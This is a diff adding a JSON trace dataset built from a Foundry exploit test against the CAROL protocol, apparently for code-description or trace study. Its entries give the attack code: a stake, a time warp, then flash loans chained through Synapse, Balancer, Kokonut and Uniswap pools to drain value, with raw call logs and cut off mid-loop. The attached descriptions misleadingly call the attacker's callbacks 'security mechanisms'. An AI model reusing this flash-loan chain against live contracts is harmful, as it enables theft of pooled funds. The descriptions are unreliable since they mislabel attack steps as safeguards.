@@ -1,0 +1,1381 @@
+[
+    {
+        "id": "2148602",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        // Prepare tx:\n        // Start with following ETH balance\n        deal(address(this), 0.07 ether);\n        emit log_named_decimal_uint(\"Exploiter ETH balance before attack\", address(this).balance, 18);\n        // Buy CAROL tokens with ETH through bonding. Create active 'Bond'\n        CAROLProtocol.buy{value: 0.03 ether}(address(this), 0);\n        // Use remaining ETH and CAROL tokens from active 'Bond' for liquidity staking in WETH_CAROL pair\n        CAROLProtocol.stake{value: 0.039 ether}(0);\n\n        // Attack tx:\n        vm.roll(block.number + 33_719);\n        // Adjusted time. Without following line, output from ICAROLProtocol.userBalance(userAddress) will be 0\n        // in later time. This is wrong.\n        vm.warp(block.timestamp + 18 hours + 39 minutes - 2 seconds);\n\n        // Flashloan WETH from Synapse\n        SynapseETHPools.flashLoan(address(this), address(WETH), WETH.balanceOf(address(SynapseETHPools)), bytes(\"\"));\n\n        withdrawingWETH = true;\n        WETH.withdraw(WETH.balanceOf(address(this)));\n\n        emit log_named_decimal_uint(\"Exploiter ETH balance after attack\", address(this).balance, 18);\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `testExploit` function simulates an attack scenario involving a series of transactions. It starts by preparing the attacker's Ethereum (ETH) balance and uses it to interact with a protocol called `CAROLProtocol`. The function buys tokens, stakes liquidity, and then manipulates the blockchain's time and block number to simulate a specific condition. Finally, it performs a flash loan from `SynapseETHPools`, withdraws WETH (Wrapped ETH), and logs the attacker's ETH balance before and after the attack.\n\n2. **Security mechanism**:  \n   The function does not explicitly include security mechanisms like access control or input validation. However, it uses `vm.roll` and `vm.warp` (likely from a testing framework like Foundry) to manipulate the blockchain's state for testing purposes. These tools are typically used in controlled environments to simulate specific conditions and are not part of the actual contract deployment. The function also emits logs to track the ETH balance before and after the attack, which can help in debugging or analysis.\n\n3. **Parameter Function**:  \n   - `CAROLProtocol.buy{value: 0.03 ether}(address(this), 0)`: This line sends 0.03 ETH to the `CAROLProtocol` to buy tokens. The `address(this)` parameter specifies the recipient of the tokens, and `0` is likely an identifier or configuration for the transaction.  \n   - `CAROLProtocol.stake{value: 0.039 ether}(0)`: This line stakes 0.039 ETH and CAROL tokens into a liquidity pool. The `0` parameter might represent a specific staking option or configuration.  \n   - `SynapseETHPools.flashLoan(address(this), address(WETH), WETH.balanceOf(address(SynapseETHPools)), bytes(\"\"))`: This line initiates a flash loan of WETH from `SynapseETHPools`. The parameters specify the recipient (`address(this)`), the token to borrow (`WETH`), the amount (the entire balance of WETH in the pool), and an empty byte array for additional data.  \n   - `WETH.withdraw(WETH.balanceOf(address(this)))`: This line withdraws all WETH held by the contract, converting it back to ETH.  \n\n4. **Return description**:  \n   The function does not return any value directly. Instead, it emits logs (`emit log_named_decimal_uint`) to display the attacker's ETH balance before and after the attack. The balance is calculated by checking the contract's ETH holdings using `address(this).balance`. The logs help track the impact of the simulated attack on the ETH balance.  \n\n**In summary**, the `testExploit` function simulates an attack by manipulating blockchain state, interacting with protocols, and using flash loans. It logs the ETH balance before and after the attack to analyze the outcome. The function is designed for testing and does not include explicit security measures for production use.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 70000000000000000 [7e16]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "550782",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "51757342280058124498 [5.175e19], 15820610504161064525238770 [1.582e25], 1701281023 [1.701e9]"
+    },
+    {
+        "id": "16939",
+        "args": "CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 6419047152569698196965 [6.419e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "24933",
+        "args": "Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 6419047152569698196965 [6.419e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "150332",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], 6419047152569698196965 [6.419e21], 0, 0, CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 1701281807 [1.701e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6419047152569698196965 [6.419e21], 20999999999999999 [2.099e16], 11482620124628244810 [1.148e19]"
+    },
+    {
+        "id": "2564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "51757342280058124498 [5.175e19], 15820610504161064525238770 [1.582e25], 1701281023 [1.701e9]"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "11017",
+        "args": "CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 6419047152569698196965 [6.419e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "23802",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "7801",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 20999999999999999 [2.099e16]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "78054",
+        "args": "CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11482620124628244810 [1.148e19]"
+    },
+    {
+        "id": "457",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "51778342280058124497 [5.177e19]"
+    },
+    {
+        "id": "651",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "15827029551313634223435735 [1.582e25]"
+    },
+    {
+        "id": "2314",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xAF1823bACd8EDDA3b815180a61F8741fA4aBc6Dd"
+    },
+    {
+        "id": "55",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "286781",
+        "args": "0",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "51778342280058124497 [5.177e19], 15827029551313634223435735 [1.582e25], 1701281507 [1.701e9]"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "51778342280058124497 [5.177e19], 15827029551313634223435735 [1.582e25], 1701281507 [1.701e9]"
+    },
+    {
+        "id": "6139",
+        "args": "CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 8344761298340607656216 [8.344e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "22933",
+        "args": "Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 8344761298340607656216 [8.344e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "85848",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], 8344761298340607656216 [8.344e21], 0, 0, CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 1701281807 [1.701e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "8344761298340607656216 [8.344e21], 27299999999999999 [2.729e16], 14927406162016718417 [1.492e19]"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "51778342280058124497 [5.177e19], 15827029551313634223435735 [1.582e25], 1701281507 [1.701e9]"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "6217",
+        "args": "CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 8344761298340607656216 [8.344e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "21802",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3001",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 27299999999999999 [2.729e16]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "32170",
+        "args": "CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685]",
+        "original_code": null,
+        "description": null,
+        "return_value": "14927406162016718417 [1.492e19]"
+    },
+    {
+        "id": "457",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "51805642280058124496 [5.18e19]"
+    },
+    {
+        "id": "651",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "15835374312611974831091951 [1.583e25]"
+    },
+    {
+        "id": "314",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xAF1823bACd8EDDA3b815180a61F8741fA4aBc6Dd"
+    },
+    {
+        "id": "55",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "7279799 [7.279e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "1701348645 [1.701e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2457",
+        "args": "SynapseETHPools: [0x6223bD82010E2fB69F329933De20897e7a4C225f]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1292165339432938199077 [1.292e21]"
+    },
+    {
+        "id": "1261891",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH: [0x4200000000000000000000000000000000000006], 1292165339432938199077 [1.292e21], 0x",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "1259198",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH: [0x4200000000000000000000000000000000000006], 1292165339432938199077 [1.292e21], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "457",
+        "args": "SynapseETHPools: [0x6223bD82010E2fB69F329933De20897e7a4C225f]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1292165339432938199077 [1.292e21]"
+    },
+    {
+        "id": "27701",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1292165339432938199077 [1.292e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1200186",
+        "args": "SynapseETHPools: [0x6223bD82010E2fB69F329933De20897e7a4C225f], WETH: [0x4200000000000000000000000000000000000006], 1292165339432938199077 [1.292e21], 1033732271546350559 [1.033e18], 0x",
+        "original_code": "    function executeOperation(\n        address sender,\n        address underlying,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata params\n    ) external {\n        // Flashloan WETH from Balancer\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = WETH.balanceOf(address(BalancerVault));\n        BalancerVault.flashLoan(address(this), tokens, amounts, bytes(\"\"));\n        WETH.transfer(address(SynapseETHPools), amount + fee);\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The main purpose of this function is to perform a flash loan operation. It borrows a specific amount of WETH (Wrapped Ether) from a Balancer vault and then transfers the borrowed amount plus a fee to another contract called SynapseETHPools. This is typically used in decentralized finance (DeFi) to execute complex transactions without needing to hold the funds upfront.\n\n2. **Security mechanism:**  \n   The function uses the `external` modifier, which means it can only be called from outside the contract, ensuring internal functions cannot misuse it. Additionally, it relies on the security of the Balancer vault for the flash loan process, which includes checks to ensure the loan is repaid. The function also ensures the correct amount of WETH is transferred by calculating `amount + fee`.\n\n3. **Parameter Function:**  \n   - `sender`: Represents the address initiating the operation.  \n   - `underlying`: Specifies the token involved in the operation (in this case, WETH).  \n   - `amount`: The quantity of WETH to be borrowed and transferred.  \n   - `fee`: An additional amount to be included in the transfer.  \n   - `params`: Additional data that can be passed for customization, though it\u2019s not used in this function.  \n\n4. **Return description:**  \n   This function does not return any value. Its primary action is to execute the flash loan and transfer the borrowed WETH plus the fee to the SynapseETHPools contract.  \n\n**In summary,**  \nThis function facilitates a flash loan of WETH from Balancer, transfers the borrowed amount plus a fee to SynapseETHPools, and ensures the operation is secure by using external modifiers and relying on Balancer\u2019s internal checks.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2457",
+        "args": "BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "824240035672384091573 [8.242e20]"
+    },
+    {
+        "id": "1186577",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0x4200000000000000000000000000000000000006], [824240035672384091573 [8.242e20]], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "457",
+        "args": "BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "824240035672384091573 [8.242e20]"
+    },
+    {
+        "id": "2350",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "5801",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 824240035672384091573 [8.242e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1159583",
+        "args": "[0x4200000000000000000000000000000000000006], [824240035672384091573 [8.242e20]], [0], 0x",
+        "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        // Flashloan WETH from Kokonut\n        uint256[] memory tokenAmounts = new uint256[](2);\n        tokenAmounts[0] = 0;\n        tokenAmounts[1] = WETH.balanceOf(address(Kokonut));\n        Kokonut.flashLoan(address(this), tokenAmounts, bytes(\"\"));\n        WETH.transfer(msg.sender, amounts[0]);\n    }\n\n",
+        "description": "1. Core functions:  \nThis function is designed to handle a flash loan, which is a type of short-term borrowing where assets are borrowed and returned within the same transaction. Specifically, it interacts with a platform called Kokonut to borrow WETH (a type of cryptocurrency) and then transfers the borrowed amount to the caller of the function. The function ensures that the borrowed funds are used and returned promptly within the same transaction.\n\n2. Security mechanism:  \nThe function uses the `external` modifier, which restricts its access to external calls only, meaning it cannot be called internally within the contract. This helps prevent unauthorized internal access. Additionally, the function relies on the `flashLoan` mechanism of Kokonut, which inherently ensures that the borrowed funds are returned within the same transaction, reducing the risk of misuse or loss of funds.\n\n3. Parameter Function:  \n- `tokens`: An array of token addresses, indicating which tokens are involved in the flash loan.  \n- `amounts`: An array of numbers representing the amounts of each token being borrowed.  \n- `feeAmounts`: An array of numbers representing the fees associated with borrowing each token.  \n- `userData`: Additional data that can be passed along with the flash loan, though it is not used in this function.  \n\n4. Return description:  \nThis function does not return any value. Instead, it performs actions: it borrows WETH from Kokonut using a flash loan and transfers the borrowed amount to the caller (`msg.sender`). The function ensures that the borrowed funds are returned within the same transaction, maintaining the integrity of the flash loan process.\n\nIn summary, this function facilitates a flash loan of WETH from Kokonut, transfers the borrowed amount to the caller, and ensures the loan is repaid within the same transaction. It uses security measures like the `external` modifier and relies on Kokonut's flash loan mechanism to safeguard the process.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2457",
+        "args": "Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "323601903726827828360 [3.236e20]"
+    },
+    {
+        "id": "1144306",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0, 323601903726827828360 [3.236e20]], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "7545",
+        "args": "Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "671024918530 [6.71e11]"
+    },
+    {
+        "id": "2559",
+        "args": "Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "671024918530 [6.71e11]"
+    },
+    {
+        "id": "457",
+        "args": "Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "323601903726827828360 [3.236e20]"
+    },
+    {
+        "id": "5801",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 323601903726827828360 [3.236e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "919189",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0, 323601903726827828360 [3.236e20]], [0, 161800951863413915 [1.618e17]], 0x",
+        "original_code": "    function onFlashLoan(\n        address initiator,\n        uint256[] calldata amounts,\n        uint256[] calldata fees,\n        bytes calldata data\n    ) external {\n        // Flashloan WETH from UniswapV3 pool\n        bytes memory data = abi.encode(uint256(WETH.balanceOf(address(WETH_USDbCV3))));\n        WETH_USDbCV3.flash(address(this), WETH.balanceOf(address(WETH_USDbCV3)), 0, data);\n        WETH.transfer(address(Kokonut), amounts[1] + fees[1]);\n    }\n\n",
+        "description": "1. Core functions:  \nThis function is designed to handle a flash loan operation, which is a type of short-term borrowing commonly used in decentralized finance (DeFi). Specifically, it borrows WETH (Wrapped Ether) from a Uniswap V3 pool and then transfers a specific amount of WETH, including fees, to another address (Kokonut). The function ensures that the borrowed funds are used and repaid within the same transaction.\n\n2. Security mechanism:  \nThe function uses the `external` modifier, which restricts its access to external calls only, preventing internal misuse. Additionally, it relies on the `flash` function of the Uniswap V3 pool, which inherently ensures that the borrowed funds are repaid within the same transaction. This mechanism prevents the risk of default or misuse of the flash loan.\n\n3. Parameter Function:  \n- `initiator`: Represents the address that initiated the flash loan.  \n- `amounts`: An array of values indicating the amounts of tokens borrowed.  \n- `fees`: An array of values representing the fees associated with the flash loan.  \n- `data`: Additional data passed to the function, which can be used for custom logic or information.  \n\n4. Return description:  \nThis function does not return any value. Its primary purpose is to execute the flash loan operation and transfer the borrowed WETH, along with the associated fees, to the specified address (Kokonut). The logic focuses on borrowing, using, and repaying the funds within the same transaction.  \n\nIn summary, this function facilitates a flash loan of WETH, ensures its repayment, and transfers the borrowed amount plus fees to a designated address, all within a single transaction. It incorporates security measures to prevent misuse and defaults.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2457",
+        "args": "WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "339247662569723970279 [3.392e20]"
+    },
+    {
+        "id": "457",
+        "args": "WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "339247662569723970279 [3.392e20]"
+    },
+    {
+        "id": "905536",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 339247662569723970279 [3.392e20], 0, 0x0000000000000000000000000000000000000000000000126401cfb22dfac2e7",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "457",
+        "args": "WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "339247662569723970279 [3.392e20]"
+    },
+    {
+        "id": "3045",
+        "args": "WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1162130361162 [1.162e12]"
+    },
+    {
+        "id": "2559",
+        "args": "WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1162130361162 [1.162e12]"
+    },
+    {
+        "id": "5801",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 339247662569723970279 [3.392e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "872508",
+        "args": "169623831284861986 [1.696e17], 0, 0x0000000000000000000000000000000000000000000000126401cfb22dfac2e7",
+        "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        uint256 repayAmount = abi.decode(data, (uint256));\n        // Following value comes from data parameter in attack tx\n        // The total amount of WETH should be this much after flashloans\n        uint256 totalAmountOfWETH = 3400e18;\n        uint256 amount0Out = totalAmountOfWETH - (WETH.balanceOf(address(this)));\n        // Borrow additional WETH amount\n        WETH_USDbCV2.swap(amount0Out, 0, address(this), abi.encodePacked(uint8(1)));\n        WETH.transfer(address(WETH_USDbCV3), repayAmount + fee0);\n    }\n\n",
+        "description": "1. Core functions:\n   The `uniswapV3FlashCallback` function is designed to handle a flash loan callback in a decentralized finance (DeFi) environment, specifically for a Uniswap V3 pool. It calculates the amount of WETH (Wrapped Ether) that needs to be borrowed to meet a target amount, executes a swap to borrow the required WETH, and then repays the flash loan along with any associated fees.\n\n2. Security mechanism:\n   - The function uses `external` visibility, meaning it can only be called from outside the contract, which is typical for callback functions.\n   - The `data` parameter is decoded to ensure the correct repayment amount is used, adding a layer of validation.\n   - The function directly interacts with the WETH and WETH_USDbCV2 contracts, ensuring that the operations are performed on verified and trusted contracts.\n\n3. Parameter Function:\n   - `fee0` and `fee1`: These parameters represent the fees associated with the flash loan for two different tokens. In this function, only `fee0` is used, indicating the fee for the WETH token.\n   - `data`: This parameter contains encoded information, specifically the repayment amount for the flash loan. It is decoded within the function to retrieve the exact amount that needs to be repaid.\n\n4. Return description:\n   The function does not return any value directly. Instead, it performs operations that result in the transfer of WETH tokens. It calculates the additional amount of WETH needed (`amount0Out`) to reach the target `totalAmountOfWETH`, executes a swap to borrow this amount, and then transfers the repayment amount plus the fee to the appropriate address.\n\nIn summary, the `uniswapV3FlashCallback` function manages the repayment of a flash loan by calculating the necessary WETH to borrow, executing a swap to acquire it, and then transferring the repayment amount plus fees to the correct address. It uses security measures like parameter validation and trusted contract interactions to ensure the process is secure and accurate.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "457",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2779254941401874089289 [2.779e21]"
+    },
+    {
+        "id": "861841",
+        "args": "620745058598125910711 [6.207e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x01",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "859142",
+        "args": "620745058598125910711 [6.207e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x01",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2421",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "7801",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 620745058598125910711 [6.207e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "689877",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 620745058598125910711 [6.207e20], 0, 0x01",
+        "original_code": "    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        emit log_named_decimal_uint(\"WETH amount after flashloans\", WETH.balanceOf(address(this)), 18);\n        // Swap all WETH to CAROL\n        WETH.approve(address(Router), type(uint256).max);\n        CAROL.approve(address(Router), type(uint256).max);\n        WETHToCAROL();\n        emit log_named_decimal_uint(\n            \"CAROL amount after swap from WETH\", CAROL.balanceOf(address(this)), CAROL.decimals()\n        );\n\n        uint256 sellAmount = CAROLProtocol.userBalance(address(this));\n        uint256 i;\n        while (i < 1000) {\n",
+        "description": "1. **Core functions:**  \n   The main purpose of this function is to handle a specific operation involving two tokens, WETH and CAROL. It starts by logging the current balance of WETH in the contract. Then, it approves the maximum possible amount of WETH and CAROL for use in a swap operation. After that, it performs a swap from WETH to CAROL and logs the resulting CAROL balance. Finally, it retrieves the user's balance of CAROL from a protocol and initiates a loop that could be used for further processing, though the loop's full logic is not shown in the provided code.\n\n2. **Security mechanism:**  \n   The function uses `approve` to allow a router contract to handle the maximum possible amount of WETH and CAROL, which is a common practice in token swaps. However, this could be risky if the router is not fully trusted. The function also emits events to log key data, which helps in tracking and debugging. The loop limit (`i < 1000`) prevents infinite loops, adding a layer of safety against potential gas exhaustion attacks.\n\n3. **Parameter Function:**  \n   - `sender`: This parameter represents the address that initiated the function call. It could be used to track who triggered the operation.  \n   - `amount0` and `amount1`: These parameters likely represent the amounts of two tokens involved in the operation, though their exact use is not fully clear in the provided code.  \n   - `data`: This parameter allows additional information to be passed into the function, which could be used for customization or further processing.\n\n4. **Return description:**  \n   The function does not explicitly return any value. Instead, it performs actions like swapping tokens and logging balances. The loop at the end suggests that further processing might occur, but the exact output or result of the function is not defined in the provided snippet.\n\n**In summary,**  \nThis function is designed to handle a token swap operation between WETH and CAROL, with logging and approval mechanisms in place. It includes basic security measures like loop limits and event logging but could be vulnerable if the router contract is not fully trusted. The parameters allow for flexibility in tracking and customization, but the function does not return a specific value.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "457",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3400000000000000000000 [3.4e21]"
+    },
+    {
+        "id": "24399",
+        "args": "Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24652",
+        "args": "Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "457",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3400000000000000000000 [3.4e21]"
+    },
+    {
+        "id": "55234",
+        "args": "3400000000000000000000 [3.4e21], 0, [0x4200000000000000000000000000000000000006, 0x4A0a76645941d8C7ba059940B3446228F0DB8972], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701352645 [1.701e9]",
+        "original_code": null,
+        "description": null,
